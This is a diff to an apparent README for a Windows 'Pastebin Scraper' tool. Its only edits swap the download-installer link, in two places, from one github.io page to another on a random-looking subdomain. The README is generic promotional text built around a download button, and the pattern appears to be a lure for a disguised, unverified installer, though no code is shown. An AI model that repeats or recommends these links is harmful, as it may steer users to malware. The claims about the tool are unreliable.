@@ -2,7 +2,7 @@
 
 Pastebin Scraper is a cutting-edge Windows desktop application engineered for efficient data extraction from the Pastebin platform. Released in 2026, it provides automated tools for downloading, analyzing, and managing paste content based on user-defined keywords and filters. Whether you're a researcher, developer, or data analyst, this tool streamlines the process of gathering paste data for various purposes.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside – Key Features
 
@@ -60,7 +60,7 @@ A: Pastebin Scraper is designed to respect Pastebin's robots.txt and rate limits
 
 To get the latest version of Pastebin Scraper, visit our download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 **Version:** 2026.15.07  
 **Last Updated:** November 2026  
